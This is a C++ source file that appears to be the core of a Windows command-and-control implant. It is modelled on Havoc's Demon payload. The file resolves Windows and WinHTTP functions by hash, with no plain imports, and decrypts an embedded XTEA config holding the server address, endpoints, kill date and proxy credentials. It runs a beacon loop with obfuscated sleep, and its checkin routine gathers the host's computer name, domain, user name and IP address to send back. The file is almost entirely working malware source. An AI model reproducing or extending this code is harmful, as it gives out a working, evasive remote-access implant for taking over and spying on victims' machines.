#include <core/include/base.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Parser;
using namespace Stream;
using namespace Modules;
using namespace Dispatcher;
using namespace Memory::Context;
using namespace Main;

// TODO: consider hash-tables for API struct

VOID Entrypoint() {
    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
        return;
    }

    MainRoutine();
}

namespace Main {
    UINT8 __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };

    VOID MainRoutine() {
        static int retry = 0;
        // TODO: thread stack spoofing
        do {
            if (!ObfuscateSleep(nullptr, nullptr) ||
                !RuntimeChecks()) {
                break;
            }

            if (!CheckTime()) {
                continue;
            }
            if (!ctx->session.checkin && !ctx->transport.message_queue) {
                if (!EnumSystem()) {
                    break;
                }
            }

            if (!DispatchRoutine()) {
                retry++;

                if (retry == ctx->session.retries) {
                    break;
                }
                continue;
            }

            retry = 0;
        }
        while (ntstatus != ERROR_EXIT);
        ContextDestroy();
    }

    BOOL EnumSystem() {
        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
        PACKET *out = CreateStreamWithHeaders(TypeCheckin);

        IP_ADAPTER_INFO adapter     = { };
        OSVERSIONINFOW os_version   = { };
        BOOL success = false;

        DWORD name_len = MAX_PATH;
        CHAR buffer[MAX_PATH] = { };

        PROCESSENTRY32 proc_entry   = { };
        proc_entry.dwSize           = sizeof(PROCESSENTRY32);

        HANDLE snap = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            goto defer;
        }

        x_ntassertb(ctx->win32.RtlGetVersion(&os_version));

        ctx->session.version = WIN_VERSION_UNKNOWN;
        os_version.dwOSVersionInfoSize = sizeof(os_version);

        if (os_version.dwMajorVersion >= 5) {
            if (os_version.dwMajorVersion == 5) {
                if (os_version.dwMinorVersion == 1) {
                    ctx->session.version = WIN_VERSION_XP;
                }
            }
            else if (os_version.dwMajorVersion == 6) {
                if (os_version.dwMinorVersion == 0) {
                    ctx->session.version = WIN_VERSION_2008;
                }
                else if (os_version.dwMinorVersion == 1) {
                    ctx->session.version = WIN_VERSION_2008_R2;
                }
                else if (os_version.dwMinorVersion == 2) {
                    ctx->session.version = WIN_VERSION_2012;
                }
                else if (os_version.dwMinorVersion == 3) {
                    ctx->session.version = WIN_VERSION_2012_R2;
                }
            } else if (os_version.dwMajorVersion == 10) {
                if (os_version.dwMinorVersion == 0) {
                    ctx->session.version = WIN_VERSION_2016_X;
                }
            }
        }

        if (ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
            if (ctx->config.hostname[0]) {
                if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
                    // LOG ERROR (bad host)
                    success = true;
                    goto defer;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        name_len = MAX_PATH;

        if (ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
            if (ctx->transport.domain[0]) {
                if (MbsBoundCompare(ctx->transport.domain, buffer, MbsLength(ctx->transport.domain)) != 0) {
                    // LOG ERROR (bad domain)
                    success = true;
                    goto defer;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        name_len = MAX_PATH;

        if (ctx->win32.GetUserNameA((LPSTR) buffer, &name_len)) {
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        name_len = sizeof(IP_ADAPTER_INFO);

        if (ctx->win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
            PackString(out, adapter.IpAddressList.IpAddress.String);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
        success = true;

        defer:
        success ? MessageQueue(out) : DestroyStream(out);
        return success;
    }

    BOOL ResolveApi() {
        // TODO: create separate ResolveApi for loader and payload
		BOOL success = true;
		x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));

		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcess, 							ctx->modules.ntdll, NTOPENPROCESS));
		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateUserProcess, 					ctx->modules.ntdll, NTCREATEUSERPROCESS));
		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateProcess, 					ctx->modules.ntdll, NTTERMINATEPROCESS));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateProcessParametersEx, 			ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyProcessParameters, 			ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcessToken, 					ctx->modules.ntdll, NTOPENPROCESSTOKEN));
		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThreadToken, 						ctx->modules.ntdll, NTOPENTHREADTOKEN));
		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateToken, 						ctx->modules.ntdll, NTDUPLICATETOKEN));
		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateObject, 						ctx->modules.ntdll, NTDUPLICATEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationToken, 				ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationProcess, 				ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
		x_assertb(F_PTR_HMOD(ctx->win32.NtFreeVirtualMemory, 					ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtAllocateVirtualMemory, 				ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtProtectVirtualMemory, 				ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtReadVirtualMemory, 					ctx->modules.ntdll, NTREADVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtWriteVirtualMemory, 					ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryVirtualMemory, 					ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateSection, 						ctx->modules.ntdll, NTCREATESECTION));
		x_assertb(F_PTR_HMOD(ctx->win32.NtMapViewOfSection, 					ctx->modules.ntdll, NTMAPVIEWOFSECTION));
		x_assertb(F_PTR_HMOD(ctx->win32.NtUnmapViewOfSection, 					ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlAddVectoredExceptionHandler, 		ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlRemoveVectoredExceptionHandler, 		ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateHeap, 							ctx->modules.ntdll, RTLCREATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlAllocateHeap, 						ctx->modules.ntdll, RTLALLOCATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlReAllocateHeap, 						ctx->modules.ntdll, RTLREALLOCATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlFreeHeap, 							ctx->modules.ntdll, RTLFREEHEAP));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyHeap, 						ctx->modules.ntdll, RTLDESTROYHEAP));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlRbInsertNodeEx, 						ctx->modules.ntdll, RTLRBINSERTNODEEX));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlGetVersion, 							ctx->modules.ntdll, RTLGETVERSION));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemInformation, 				ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemTime, 						ctx->modules.ntdll, NTQUERYSYSTEMTIME));
		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateThreadEx, 						ctx->modules.ntdll, NTCREATETHREADEX));
		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThread, 							ctx->modules.ntdll, NTOPENTHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateThread, 						ctx->modules.ntdll, NTTERMINATETHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtResumeThread, 						ctx->modules.ntdll, NTRESUMETHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtGetContextThread, 					ctx->modules.ntdll, NTGETCONTEXTTHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtSetContextThread, 					ctx->modules.ntdll, NTSETCONTEXTTHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtSetInformationThread, 				ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtTestAlert, 							ctx->modules.ntdll, NTTESTALERT));
		x_assertb(F_PTR_HMOD(ctx->win32.NtDelayExecution, 						ctx->modules.ntdll, NTDELAYEXECUTION));
		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateEvent, 							ctx->modules.ntdll, NTCREATEEVENT));
		x_assertb(F_PTR_HMOD(ctx->win32.NtQueueApcThread, 						ctx->modules.ntdll, NTQUEUEAPCTHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtAlertResumeThread, 					ctx->modules.ntdll, NTALERTRESUMETHREAD));
		x_assertb(F_PTR_HMOD(ctx->win32.NtWaitForSingleObject, 					ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->win32.NtSignalAndWaitForSingleObject, 		ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->win32.NtContinue, 							ctx->modules.ntdll, NTCONTINUE));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlInitUnicodeString, 					ctx->modules.ntdll, RTLINITUNICODESTRING));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlHashUnicodeString, 					ctx->modules.ntdll, RTLHASHUNICODESTRING));
		x_assertb(F_PTR_HMOD(ctx->win32.RtlRandomEx, 							ctx->modules.ntdll, RTLRANDOMEX));
		x_assertb(F_PTR_HMOD(ctx->win32.NtClose, 								ctx->modules.ntdll, NTCLOSE));

		x_assertb(F_PTR_HMOD(ctx->win32.FlushInstructionCache,                  ctx->modules.kernel32, FLUSHINSTRUCTIONCACHE));
		x_assertb(F_PTR_HMOD(ctx->win32.IsBadReadPtr,                           ctx->modules.kernel32, ISBADREADPTR));
		x_assertb(F_PTR_HMOD(ctx->win32.DeviceIoControl,                        ctx->modules.kernel32, DEVICEIOCONTROL));
		x_assertb(F_PTR_HMOD(ctx->win32.FileTimeToSystemTime, 					ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
		x_assertb(F_PTR_HMOD(ctx->win32.GetCurrentDirectoryA, 					ctx->modules.kernel32, GETCURRENTDIRECTORYA));
		x_assertb(F_PTR_HMOD(ctx->win32.SystemTimeToTzSpecificLocalTime, 		ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
		x_assertb(F_PTR_HMOD(ctx->win32.GetFileAttributesW, 					ctx->modules.kernel32, GETFILEATTRIBUTESW));
		x_assertb(F_PTR_HMOD(ctx->win32.CreateFileW, 							ctx->modules.kernel32, CREATEFILEW));
		x_assertb(F_PTR_HMOD(ctx->win32.FindFirstFileA, 						ctx->modules.kernel32, FINDFIRSTFILEA));
		x_assertb(F_PTR_HMOD(ctx->win32.FindFirstFileW, 						ctx->modules.kernel32, FINDFIRSTFILEW));
		x_assertb(F_PTR_HMOD(ctx->win32.FindNextFileA, 							ctx->modules.kernel32, FINDNEXTFILEA));
		x_assertb(F_PTR_HMOD(ctx->win32.FindNextFileW, 							ctx->modules.kernel32, FINDNEXTFILEW));
		x_assertb(F_PTR_HMOD(ctx->win32.FindClose, 								ctx->modules.kernel32, FINDCLOSE));
		x_assertb(F_PTR_HMOD(ctx->win32.GetFileSize, 							ctx->modules.kernel32, GETFILESIZE));
		x_assertb(F_PTR_HMOD(ctx->win32.ReadFile, 								ctx->modules.kernel32, READFILE));
		x_assertb(F_PTR_HMOD(ctx->win32.CallNamedPipeW, 						ctx->modules.kernel32, CALLNAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->win32.CreateNamedPipeW, 						ctx->modules.kernel32, CREATENAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->win32.WaitNamedPipeW, 						ctx->modules.kernel32, WAITNAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->win32.SetNamedPipeHandleState, 				ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
		x_assertb(F_PTR_HMOD(ctx->win32.ConnectNamedPipe, 						ctx->modules.kernel32, CONNECTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->win32.TransactNamedPipe, 						ctx->modules.kernel32, TRANSACTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->win32.DisconnectNamedPipe, 					ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->win32.PeekNamedPipe, 							ctx->modules.kernel32, PEEKNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->win32.GetProcAddress, 						ctx->modules.kernel32, GETPROCADDRESS));
		x_assertb(F_PTR_HMOD(ctx->win32.GetModuleHandleA, 						ctx->modules.kernel32, GETMODULEHANDLEA));
		x_assertb(F_PTR_HMOD(ctx->win32.LoadLibraryA, 							ctx->modules.kernel32, LOADLIBRARYA));
		x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary, 							ctx->modules.kernel32, FREELIBRARY));
    	x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process, 						ctx->modules.kernel32, ISWOW64PROCESS));
		x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
		x_assertb(F_PTR_HMOD(ctx->win32.Process32First, 						ctx->modules.kernel32, PROCESS32FIRST));
		x_assertb(F_PTR_HMOD(ctx->win32.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
		x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
		x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA, 					ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
		x_assertb(F_PTR_HMOD(ctx->win32.SleepEx, 								ctx->modules.kernel32, SLEEPEX));
    	x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
		x_assertb(F_PTR_HMOD(ctx->win32.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->win32.LockResource, 							ctx->modules.kernel32, LOCKRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->win32.SizeofResource, 						ctx->modules.kernel32, SIZEOFRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));

		//TODO: these loaded libraries will need mod->base. Everything else can be freed.
		x_assertb(ctx->modules.dload.shlwapi  = ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false));
        x_assertb(ctx->modules.dload.crypt32  = ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false));
        x_assertb(ctx->modules.dload.winhttp  = ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false));
        x_assertb(ctx->modules.dload.advapi   = ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false));
        x_assertb(ctx->modules.dload.iphlpapi = ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false));
        x_assertb(ctx->modules.dload.mscoree  = ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false));

		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							(HMODULE)ctx->modules.dload.advapi->base, GETUSERNAMEA));
		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						(HMODULE)ctx->modules.dload.advapi->base, LOOKUPACCOUNTSIDW));
		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					(HMODULE)ctx->modules.dload.advapi->base, LOOKUPPRIVILEGEVALUEA));
		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						(HMODULE)ctx->modules.dload.advapi->base, ADDMANDATORYACE));
		x_assertb(F_PTR_HMOD(ctx->win32.SetEntriesInAclA, 						(HMODULE)ctx->modules.dload.advapi->base, SETENTRIESINACLA));
		x_assertb(F_PTR_HMOD(ctx->win32.AllocateAndInitializeSid, 				(HMODULE)ctx->modules.dload.advapi->base, ALLOCATEANDINITIALIZESID));
		x_assertb(F_PTR_HMOD(ctx->win32.InitializeSecurityDescriptor, 			(HMODULE)ctx->modules.dload.advapi->base, INITIALIZESECURITYDESCRIPTOR));
		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorDacl, 				(HMODULE)ctx->modules.dload.advapi->base, SETSECURITYDESCRIPTORDACL));
		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl, 				(HMODULE)ctx->modules.dload.advapi->base, SETSECURITYDESCRIPTORSACL));
		x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl, 							(HMODULE)ctx->modules.dload.advapi->base, INITIALIZEACL));
		x_assertb(F_PTR_HMOD(ctx->win32.FreeSid, 								(HMODULE)ctx->modules.dload.advapi->base, FREESID));
		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				(HMODULE)ctx->modules.dload.advapi->base, IMPERSONATELOGGEDONUSER));
		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					(HMODULE)ctx->modules.dload.advapi->base, ADJUSTTOKENPRIVILEGES));
		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							(HMODULE)ctx->modules.dload.advapi->base, REGOPENKEYEXA));
		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						(HMODULE)ctx->modules.dload.advapi->base, REGCREATEKEYEXA));
		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						(HMODULE)ctx->modules.dload.advapi->base, REGSETVALUEEXA));
		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							(HMODULE)ctx->modules.dload.advapi->base, REGCLOSEKEY));
		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						(HMODULE)ctx->modules.dload.iphlpapi->base, GETADAPTERSINFO));
		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						(HMODULE)ctx->modules.dload.mscoree->base, CLRCREATEINSTANCE));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPOPEN));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    (HMODULE)ctx->modules.dload.winhttp->base, WINHTTPCONNECT));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPOPENREQUEST));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpAddRequestHeaders, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPADDREQUESTHEADERS));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSetOption, 						(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPSETOPTION));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetProxyForUrl, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPGETPROXYFORURL));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, 	(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSendRequest, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPSENDREQUEST));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReceiveResponse, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPRECEIVERESPONSE));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReadData, 						(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPREADDATA));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPQUERYHEADERS));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPQUERYDATAAVAILABLE));
		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPCLOSEHANDLE));
		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					(HMODULE)ctx->modules.dload.crypt32->base, CRYPTSTRINGTOBINARYA));
		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					(HMODULE)ctx->modules.dload.crypt32->base, CRYPTBINARYTOSTRINGA));

        defer:
		return success;
	}

    BOOL ReadConfig() {
        PARSER parser  = { };
        BOOL success    = true;

        CreateParser(&parser, Config, sizeof(Config));
        MemSet(Config, 0, sizeof(Config));

        ctx->transport.message_queue  = nullptr;
        ctx->session.peer_id	      = UnpackUint32(&parser);

        ParserMemcpy(&parser, &ctx->config.session_key, nullptr);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(parser.buffer), parser.length, ctx->config.session_key, false);
        }

        ParserStrcpy(&parser, &ctx->config.hostname, nullptr);

        ctx->session.retries        = UnpackUint32(&parser);
        ctx->config.working_hours   = UnpackUint32(&parser);
        ctx->config.kill_date       = UnpackUint64(&parser);
        ctx->config.sleeptime       = UnpackUint32(&parser);
        ctx->config.jitter          = UnpackUint32(&parser);

#ifdef TRANSPORT_HTTP
        ctx->transport.http = (_http_context*) Malloc(sizeof(_http_context));

        ctx->transport.http->handle     = nullptr;
        ctx->transport.http->endpoints  = nullptr;
        ctx->transport.http->headers    = nullptr;

        ParserWcscpy(&parser, &ctx->transport.http->useragent, nullptr);
        ParserWcscpy(&parser, &ctx->transport.http->address, nullptr  );
        ctx->transport.http->port = (int) UnpackUint32(&parser);
        ParserStrcpy(&parser, &ctx->transport.domain, nullptr);

        ctx->transport.http->n_endpoints = UnpackUint32(&parser);
        ctx->transport.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((ctx->transport.http->n_endpoints + 1)));

        for (auto i = 0; i < ctx->transport.http->n_endpoints; i++) {
            ParserWcscpy(&parser, &ctx->transport.http->endpoints[i], nullptr);
        }

        ctx->transport.http->endpoints[ctx->transport.http->n_endpoints] = nullptr;
        ctx->transport.b_proxy = UnpackBool(&parser);

        if (ctx->transport.b_proxy) {
            ctx->transport.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
            ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;

            ParserWcscpy(&parser, &ctx->transport.http->proxy->address, nullptr );
            ParserWcscpy(&parser, &ctx->transport.http->proxy->username, nullptr );
            ParserWcscpy(&parser, &ctx->transport.http->proxy->password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        ParserWcscpy(&parser, &ctx->transport.egress_pipe, nullptr);
#endif

        defer:
        DestroyParser(&parser);
        return success;
    }
}

